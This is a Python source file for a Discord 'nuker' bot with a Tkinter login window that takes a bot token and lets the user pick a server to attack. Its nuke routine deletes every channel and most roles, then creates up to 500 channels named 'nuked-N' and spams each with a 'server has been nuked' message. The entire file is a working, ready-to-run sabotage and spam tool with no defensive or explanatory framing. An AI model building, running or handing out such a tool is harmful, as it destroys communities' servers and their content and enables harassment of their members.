import discord
import tkinter as tk
from tkinter import messagebox, ttk
from discord.ext import commands
import threading
import asyncio

# Define the bot with intents
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.messages = True
intents.message_content = True  # Enable message content intent (if required)

bot = commands.Bot(command_prefix='!', intents=intents)

# Global variables
bot_token = None
selected_guild_id = None

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')
    # After logging in, show the server selection window
    show_server_selection()

@bot.command()
async def nuke(ctx):
    # Permissions check
    if not ctx.guild.me.guild_permissions.manage_channels or not ctx.guild.me.guild_permissions.manage_roles:
        await ctx.reply('🚫 I do not have permission to manage channels and roles!')
        return

    # Send a message to all text channels before deleting them
    for channel in ctx.guild.text_channels:
        try:
            await channel.send("This server has been nuked! 🚨")
        except Exception as e:
            print(f"Failed to send message to {channel.name}: {e}")

    # Delete all channels
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"Failed to delete {channel.name}: {e}")

    # Delete all roles except the bot's roles
    bot_roles = [role.id for role in ctx.guild.me.roles]
    for role in ctx.guild.roles:
        if role.id not in bot_roles and role.editable:
            try:
                await role.delete()
            except Exception as e:
                print(f"Failed to delete role {role.name}: {e}")

    # Wait a few seconds and create new channels
    await ctx.reply('All channels and roles have been nuked! Creating new channels...')
    await asyncio.sleep(5)
    await create_nuked_channels(ctx.guild)

async def create_nuked_channels(guild):
    # Create new channels until the server reaches 500 channels
    for i in range(1, 501):
        try:
            channel_name = f'nuked-{i}'
            await guild.create_text_channel(channel_name)
            print(f"Created channel: {channel_name}")
        except Exception as e:
            print(f"Failed to create channel: {e}")
            break

    # Spam a message in all channels
    for channel in guild.text_channels:
        try:
            await channel.send("This server has been nuked! 🚨")
        except Exception as e:
            print(f"Failed to send message to {channel.name}: {e}")

def run_bot():
    try:
        bot.run(bot_token)
    except Exception as e:
        print(f"Error: {e}")
        messagebox.showerror("Bot Error", f"Failed to start bot: {e}")

def start_bot():
    global bot_token
    bot_token = token_entry.get().strip()
    if not bot_token:
        messagebox.showerror("Error", "No bot token provided.")
        return

    login_button.config(state=tk.DISABLED)  # Disable button after clicking
    messagebox.showinfo("Logging in", "Please wait while the bot logs in...")

    # Run the bot in a separate thread to prevent UI freeze
    threading.Thread(target=run_bot, daemon=True).start()

    # Hide the token window after the bot logs in
    root.after(1000, root.withdraw)  # Hide the login window 1 second after login attempt

def show_server_selection():
    # Create a new window for server selection
    server_window = tk.Toplevel(root)
    server_window.title("Select a Server")
    server_window.geometry("400x300")

    # Fetch the list of servers (guilds) the bot is in
    guilds = bot.guilds

    if not guilds:
        messagebox.showinfo("No Servers", "The bot is not in any servers.")
        return

    # Display the list of servers in a dropdown menu
    tk.Label(server_window, text="Select a server:").pack(pady=10)

    guild_names = [guild.name for guild in guilds]
    guild_combobox = ttk.Combobox(server_window, values=guild_names, state="readonly")
    guild_combobox.pack(pady=10)

    def on_server_select():
        global selected_guild_id
        selected_guild_name = guild_combobox.get()
        selected_guild = next((guild for guild in guilds if guild.name == selected_guild_name), None)
        if selected_guild:
            selected_guild_id = selected_guild.id
            server_window.destroy()
            messagebox.showinfo("Server Selected", f"Selected server: {selected_guild_name}")
            # Perform the action on the selected server
            perform_action_on_server(selected_guild_id)
        else:
            messagebox.showerror("Error", "Invalid server selection.")

    select_button = tk.Button(server_window, text="Select", command=on_server_select)
    select_button.pack(pady=10)

def perform_action_on_server(guild_id):
    # Find the guild by ID
    guild = bot.get_guild(guild_id)
    if guild:
        # Perform the action (e.g., !nuke) on the selected server
        asyncio.run_coroutine_threadsafe(nuke_guild(guild), bot.loop)

async def nuke_guild(guild):
    # Simulate the !nuke command on the selected guild
    ctx = await bot.get_context(await guild.text_channels[0].send("!nuke"))
    await bot.invoke(ctx)

# Initialize the main GUI window for bot token input
root = tk.Tk()
root.title("Discord Bot Login")
root.geometry("400x200")

tk.Label(root, text="Enter your Discord bot token:").pack(pady=10)
token_entry = tk.Entry(root, width=50, show="*")  # Hide token input for security
token_entry.pack(pady=5)

login_button = tk.Button(root, text="Login", command=start_bot)
login_button.pack(pady=10)

root.mainloop()
